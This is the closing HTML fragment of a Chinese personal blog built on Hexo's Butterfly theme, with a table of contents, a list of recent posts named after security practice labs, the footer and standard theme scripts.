class="toc-item toc-level-4"><a class="toc-link" href="#level-1"><span class="toc-number">1.</span> <span class="toc-text">level-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-2"><span class="toc-number">2.</span> <span class="toc-text">level-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-3"><span class="toc-number">3.</span> <span class="toc-text">level-3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-4"><span class="toc-number">4.</span> <span class="toc-text">level-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-5"><span class="toc-number">5.</span> <span class="toc-text">level-5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-6"><span class="toc-number">6.</span> <span class="toc-text">level-6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-7"><span class="toc-number">7.</span> <span class="toc-text">level-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-8"><span class="toc-number">8.</span> <span class="toc-text">level-8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level-9"><span class="toc-number">9.</span> <span class="toc-text">level-9</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/02/twcms/" title="twcms">twcms</a><time datetime="2024-11-02T09:44:38.000Z" title="发表于 2024-11-02 17:44:38">2024-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/23/TASK-2-upload-labs/" title="TASK 2-upload-labs">TASK 2-upload-labs</a><time datetime="2024-10-23T06:50:34.000Z" title="发表于 2024-10-23 14:50:34">2024-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/10/TASK-3-vulhub/" title="TASK 3 vulhub">TASK 3 vulhub</a><time datetime="2024-10-10T10:59:48.000Z" title="发表于 2024-10-10 18:59:48">2024-10-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/04/TASK-2-php-SER-libs-main/" title="TASK 2-php-SER-libs-main">TASK 2-php-SER-libs-main</a><time datetime="2024-10-04T06:29:00.000Z" title="发表于 2024-10-04 14:29:00">2024-10-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/24/TASK-1-SQL/" title="TASK 1-SQL">TASK 1-SQL</a><time datetime="2024-09-24T02:19:06.000Z" title="发表于 2024-09-24 10:19:06">2024-09-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 一安</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>